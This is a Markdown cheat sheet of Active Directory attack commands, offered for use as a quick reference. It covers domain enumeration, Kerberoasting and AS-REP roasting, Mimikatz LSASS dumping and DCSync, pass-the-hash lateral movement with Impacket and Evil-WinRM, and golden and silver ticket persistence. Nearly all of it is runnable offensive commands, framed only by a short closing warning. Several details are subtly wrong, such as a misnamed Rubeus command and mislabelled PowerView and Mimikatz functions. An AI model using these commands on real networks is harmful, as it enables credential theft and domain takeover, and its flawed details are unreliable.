# Active Directory Hacking Cheat Sheet

A reference guide for command syntax and execution steps during Active Directory (AD) security audits, network pivoting, and domain controller exploitation.

---

## 1. Domain Enumeration (Windows Command Line)

Basic commands to run when connected to a domain-joined machine.

| Command | Description |
| :--- | :--- |
| `net view /domain` | View current domain name |
| `net user /domain` | List all domain users |
| `net group "Domain Admins" /domain` | List all users in the Domain Admins group |
| `net localgroup administrators` | List local administrators on the current machine |
| `net accounts /domain` | View domain password policy requirements |
| `nltest /dclist:domain.local` | List domain controllers (DCs) |
| `set user` | Show current user's logon server and domain configurations |

---

## 2. PowerView (PowerShell AD Enumeration)

PowerView is a powerful PowerShell script (part of PowerSploit) used for advanced AD domain enumeration.

*   **Import PowerView:**
    ```powershell
    Import-Module .\PowerView.ps1
    ```
*   **Get basic domain information:**
    ```powershell
    Get-NetDomain
    ```
*   **Find domain controllers:**
    ```powershell
    Get-NetDomainController
    ```
*   **List all users with administrative access:**
    ```powershell
    Get-NetUser | Select-Object samaccountname, description, memberof
    ```
*   **Find active sessions on other machines (pivoting target discovery):**
    ```powershell
    Find-LocalAdminAccess
    ```
*   **Find domain trusts:**
    ```powershell
    Get-NetDomainTrust
    ```

---

## 3. Kerberos Hacking

### A. Kerberoasting
Extracting service account password hashes from Active Directory and cracking them offline (Service Principal Names - SPNs).

*   **Using Rubeus (Windows):**
    ```cmd
    Rubeus.exe kerberoasting /outfile:hashes.txt
    ```
*   **Using Impacket (Linux):**
    ```bash
    impacket-GetUserSPNs -request -dc-ip <DomainControllerIP> domain.local/username:password -outputfile hashes.txt
    ```
*   **Cracking hashes offline (Hashcat mode 13100):**
    ```bash
    hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
    ```

### B. AS-REP Roasting
Targeting accounts that do not require Kerberos preauthentication.

*   **Using Rubeus:**
    ```cmd
    Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
    ```
*   **Using Impacket:**
    ```bash
    impacket-GetNPUsers -request -dc-ip <DomainControllerIP> domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
    ```
*   **Cracking hashes offline (Hashcat mode 18200):**
    ```bash
    hashcat -m 18200 asrep_hashes.txt wordlist.txt
    ```

---

## 4. Credential Access & Lateral Movement

### A. Mimikatz Credential Dumping
Dumping passwords, hashes, and PINs from LSASS memory. Must be run with Local Administrator or SYSTEM permissions.

*   **Privilege escalation & debug check:**
    ```cmd
    privilege::debug
    ```
*   **Dump LSA Secrets (plaintext passwords/NTLM hashes):**
    ```cmd
    sekurlsa::logonpasswords
    ```
*   **Dump SAM database (local hashes):**
    ```cmd
    lsadump::sam
    ```
*   **Dump Domain Controller hashes (via DCSync attack):**
    ```cmd
    lsadump::dcsync /domain:domain.local /user:Administrator
    ```

### B. Overpass-the-Hash (NTLM -> Kerberos Ticket)
Creating a Kerberos ticket from an NTLM hash.

*   **Using Rubeus:**
    ```cmd
    Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_Hash> /ptt
    ```

### C. Impacket Lateral Movement (Linux -> Windows)
Accessing remote machines over SMB.

*   **Dumping remote hashes (Secretsdump):**
    ```bash
    impacket-secretsdump -hashes :<NTLM_Hash> domain.local/Administrator@<TargetIP>
    ```
*   **Obtaining a remote command line (PsExec):**
    ```bash
    impacket-psexec -hashes :<NTLM_Hash> domain.local/Administrator@<TargetIP>
    ```
*   **Obtaining shell via WinRM (Evil-WinRM):**
    ```bash
    evil-winrm -i <TargetIP> -u Administrator -H <NTLM_Hash>
    ```

---

## 5. Persistence (Golden & Silver Tickets)

Once Domain Administrator rights are gained, secure permanent access.

*   **Create Golden Ticket (TGT for any user, valid for years):**
    *Requires Domain SID and Krbtgt account NTLM hash.*
    ```cmd
    mimikatz # kerberos::golden /user:fake_admin /domain:domain.local /sid:S-1-5-21-XXXXX /krbtgt:<krbtgt_ntlm_hash> /id:500 /ptt
    ```
*   **Create Silver Ticket (TGS ticket for specific service like CIFS/SMB):**
    *Requires Domain SID and Target Machine account NTLM hash.*
    ```cmd
    mimikatz # kerberos::golden /user:fake_admin /domain:domain.local /sid:S-1-5-21-XXXXX /target:DC.domain.local /service:cifs /rc4:<computer_ntlm_hash> /id:500 /ptt
    ```

---

## 6. Disclaimer

> [!WARNING]
> Active Directory attacks can disrupt production servers. Always verify targeting parameters and coordinate with system administrators during auditing assessments.
